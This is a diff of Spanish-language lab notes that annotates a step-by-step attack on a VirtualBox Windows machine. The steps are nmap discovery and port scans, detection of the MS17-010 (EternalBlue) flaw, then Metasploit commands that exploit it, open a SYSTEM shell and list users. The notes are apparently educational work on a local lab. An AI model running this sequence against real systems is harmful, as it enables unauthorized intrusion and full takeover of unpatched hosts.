@@ -18,7 +18,7 @@ cantidad de maquinas activas: 23
 cantidad de maquinas virtuales: 7
 ip del router: 10.0.0.1
 
-2 sudo namp -sn 10.0.0.0/24
+2 sudo namp -sn 10.0.0.0/24    ///// hace el escaneo y muestra los dispositivos activos en la red actualmente susu mac y ips 
 Resultados:
 
 cantidad de maquinas activas: 23
@@ -33,12 +33,12 @@ ip de las maquinas virtuales:
 10.0.0.206
 10.0.0.207
 
-3 ping -c 1 [ip-posibles-maquinas-virtuales-vulnerables]
+3 ping -c 1 [ip-posibles-maquinas-virtuales-vulnerables]     ////// comprueba la coneccion con uno de ellos enviandoles paquetes 
 Resultados:
 
 ip de la maquina victima: 10.0.0.181
 
-4 nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 10.0.0.181
+4 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.0.0.181  ///// busca los puertos abriertos de ese dispositivos . 5000 indica  la velocidad en la que intentara verificar para que el fire wall no lo detecte 
 
 Resultados:
 PORT      STATE SERVICE      VERSION
@@ -62,7 +62,8 @@ PORT      STATE SERVICE      REASON
 49158/tcp open  unknown      syn-ack ttl 128
 MAC Address: 08:00:27:BF:99:A9 (Oracle VirtualBox virtual NIC)
 ---------------------------------------------------------------
-5 Nmap -sCV -p 135,139,445,49158 10.0.0.181 -oN res-targeted
+5 Nmap -sCV -p 135,139,445,49158 10.0.0.181 -oN res-targeted          ////////////Ese comando de Nmap realiza un escaneo enfocado en la máquina 10.0.0.181, aplicando los scripts por defecto (`-sC`) y la detección de versiones de servicios (`-sV`) sobre los puertos 135, 139, 445 y 49158, que corresponden principalmente a servicios de Windows como RPC y SMB, con el objetivo de identificar qué servicios están activos, qué versiones utilizan y posibles vulnerabilidades asociadas, y finalmente guarda los resultados en un archivo de salida llamado `res-targeted` para su análisis posterior.
+
 
 Resultados:
 
@@ -88,7 +89,7 @@ Host script results:
 |   date: 2026-01-16T23:56:33
 |_  start_date: 2026-01-16T22:02:20
 
-6 nmap --script "vuln and safe" -p 445 10.0.0.181
+6 nmap --script "vuln and safe" -p 445 10.0.0.181     ///// se usa para escanear un puerto y saber si es vulne rable o no 
  Resultados:
 PORT    STATE SERVICE
 445/tcp open  microsoft-ds
@@ -110,12 +111,12 @@ Host script results:
 |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
 |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
 
-7 msfconsole -q
+7 msfconsole -q        ///////// se usa para ejecuatr meta exploit en la consola luegoi de saber la bulnerabilidad 
 
 Resultado:
 msf >
 
-8 search eternalblue
+8 search eternalblue      ////// se usa para busar la libreria de esa vulnerabilidad 
 
    #   Name                                           Disclosure Date  Rank     Check  Description
    -   ----                                           ---------------  ----     -----  -----------
@@ -154,16 +155,17 @@ msf >
 Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
 After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
 
-9 use 0
+9 use 0   /////// se usa para seleccionar una de las acciones del comando anterior 
 
-10 show options
+10 show options      ////////////para mostarr opciones 
 
-11 set RHOST 10.0.0.181
+11 set RHOST 10.0.0.181   ////////////             El comando `set RHOST 10.0.0.181` se utiliza dentro de Metasploit Framework para indicar cuál es la dirección IP del host remoto que será el objetivo del módulo que se está configurando, ya sea de explotación, escaneo o post-explotación, de modo que al establecer este parámetro el sistema sabe a qué máquina debe conectarse y ejecutar las acciones definidas en el módulo seleccionado.
 
-12 exploit
-13 shell
 
-14 whoami
+12 exploit           /////////// se le da la orden a msf que explote la vulnerabilidad encontrada y abrir el entorno del meterpreter probando entrar por los puertos , cuando encuentra uno pone win y hable la interfaz de meterpreter 
+13 shell         ////////////  abre el cmd de la maquina infectada        
+
+14 whoami      //////////// muestra la autoridad dento de la pc afectada y siempre sera autority system que es mayo que los administradores
 
 15 net user
 16 net localgroup
